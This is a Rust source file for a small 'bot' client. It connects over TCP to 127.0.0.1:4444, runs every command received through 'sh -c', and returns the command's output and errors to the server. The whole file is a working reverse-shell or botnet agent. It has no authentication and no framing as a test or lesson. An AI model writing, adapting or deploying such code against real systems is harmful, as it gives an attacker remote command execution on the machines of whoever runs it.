use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> io::Result<()> {
    let server_address = "127.0.0.1:4444";

    println!("Connecting to server at {}...", server_address);

    match TcpStream::connect(server_address) {
        Ok(mut stream) => {
            println!("Connected to server!");

            loop {
                // Read command from server
                let mut buffer = [0; 1024];
                match stream.read(&mut buffer) {
                    Ok(0) => {
                        // Connection closed by server
                        println!("Connection closed by server");
                        break;
                    }
                    Ok(n) => {
                        // Convert bytes to string
                        let command_str = String::from_utf8_lossy(&buffer[..n]);
                        let command = command_str.trim();

                        println!("Received command: {}", command);

                        // Execute command
                        let output = Command::new("sh")
                            .arg("-c")
                            .arg(command)
                            .output();

                        match output {
                            Ok(output) => {
                                // Prepare response
                                let stdout = String::from_utf8_lossy(&output.stdout);
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                let status = if output.status.success() { "success" } else { "failed" };

                                let response = format!(
                                    "Status: {}\nOutput:\n{}\nError:\n{}",
                                    status, stdout, stderr
                                );

                                // Send response back to server
                                if let Err(e) = stream.write_all(response.as_bytes()) {
                                    eprintln!("Failed to send response: {}", e);
                                    break;
                                }

                                // Flush the stream to ensure data is sent
                                if let Err(e) = stream.flush() {
                                    eprintln!("Failed to flush stream: {}", e);
                                    break;
                                }
                            }
                            Err(e) => {
                                let error_msg = format!("Failed to execute command: {}\n", e);
                                eprintln!("{}", error_msg);

                                // Send error back to server
                                if let Err(write_err) = stream.write_all(error_msg.as_bytes()) {
                                    eprintln!("Failed to send error response: {}", write_err);
                                    break;
                                }

                                if let Err(e) = stream.flush() {
                                    eprintln!("Failed to flush stream: {}", e);
                                    break;
                                }
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("Failed to read from stream: {}", e);
                        break;
                    }
                }
            }
        }
        Err(e) => {
            eprintln!("Failed to connect to server: {}", e);
            return Err(e);
        }
    }

    println!("Bot shutting down");
    Ok(())
}

